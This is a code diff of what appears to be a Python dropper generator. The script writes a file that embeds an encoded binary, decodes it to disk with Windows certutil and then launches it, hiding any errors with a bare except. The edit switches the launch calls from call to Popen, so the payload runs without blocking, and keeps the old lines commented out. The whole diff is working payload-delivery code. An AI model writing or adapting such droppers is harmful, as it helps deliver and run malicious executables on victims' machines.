@@ -58,13 +58,23 @@ f.write("#!/usr/bin/python3\n")
 f.write("encoded = '''\n")
 f.write(str(enc))
 f.write("'''")
+#f.write('''
+#print(encoded)
+#open("encodedstring","w").write(encoded)
+#try:
+#    from subprocess import call
+#    call(["certutil", "-decode", "encodedstring", "{0}"])
+#    call(["{1}"])
+#except:
+#    pass
+#'''.format(outputfile[-1], outputfile[-1]))
 f.write('''
 print(encoded)
 open("encodedstring","w").write(encoded)
 try:
-    from subprocess import call
-    call(["certutil", "-decode", "encodedstring", "{0}"])
-    call(["{1}"])
+    from subprocess import Popen
+    Popen(["certutil", "-decode", "encodedstring", "{0}"])
+    Popen(["{1}"])
 except:
     pass
 '''.format(outputfile[-1], outputfile[-1]))
